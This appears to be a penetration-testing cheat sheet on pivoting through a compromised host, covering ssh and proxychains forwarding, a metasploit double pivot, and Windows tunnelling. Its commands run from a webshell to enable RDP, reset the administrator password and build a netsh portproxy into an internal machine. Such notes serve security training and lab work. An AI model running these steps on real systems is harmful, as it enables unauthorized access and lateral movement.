# Forwarding

Port forwarding can be useful if you get on to a victim and they are running a service locally that you want to interact with back on the attack machine. Or if the victim is connected to a network the attacker cannot access directly, proxychains in this case would allow the attacker to use the victim to attack the rest of the network


## ssh

![Pasted image 20220807173120](https://github.com/dbissell6/Shadow_Stone/assets/50979196/0868e1b6-51dd-443b-8adc-e7b5a0b44764)

<img width="587" alt="Screen Shot 2022-10-02 at 7 14 03 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/790e1b77-fde9-4761-ae00-e3cda178ff00">

## Example with ssh and proxy chains
This example assumes attacker reached a victim that has access to networks the attacker had not previously had access to.

## proxychains
make sure config is set up

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/12574f68-19d3-4858-824f-b589face8588)

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/1fe6b9e9-7206-4351-898c-1927972db6a1)


```
proxychains nmap -sV -sC -Pn -v -A --reason 172.16.8.3 2>&1 | grep -v -E 'socket error|timeout|Strict'
```

### Using Firefox
Settings-> proxy

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/8e5ae2e6-6dcc-4110-ae32-be7936c977f4)

## Double pivot with metasploit
This chain will allow us to directly ssh MGMT01 from kali
Attack -> dmz01 -> DC01 -> MGMT01

3 steps 
1) create linux meterpreter shell for dmz01
2) create windows meterpreter shell for DC01
3) configure msfconsole
4) run dmz

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/de563e25-4b0b-4373-91ce-be1e27496bb1)


## chisel


## without ssh on windows

without ssh 
First, from the webshell, set the registry key so we can log in

```Powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```

dont know any creds on the box so let’s just change the local admin’s pass, from the webshell

```Powershell
net user administrator newpass
```

now, from the linux attack host, log into a very limited cmd shell on WEB-WIN01 to setup a tunnel, where WEB-WIN01 is also the 10.X.X.X ip address of the webshell

```bash
xfreerdp /v:<WEB-WIN01> /u:administrator /p:newpass /cert:ignore
```

in the new RDP cmd window, after using `nslookup` to discover MS01 is `172.16.6.50` , make a tunnel with the `netsh` command which links WEB01’s 10.X.X.X reachable address on port 1515 to MS01’s RDP port 3389, like this:

```cmd
netsh interface portproxy add v4tov4 listenport=1515 listenaddress=<WEB-WIN01> connectport=3389 connectaddress=172.16.6.50
```

RDP into MS01 from our attack host through the tunnel we just made to MS01 on WEB-WIN01 port 1515:

```bash
xfreerdp /v:<WEB-WIN01>:1515 /u:svc_XXX /p:XXckX7 /cert:ignore
```
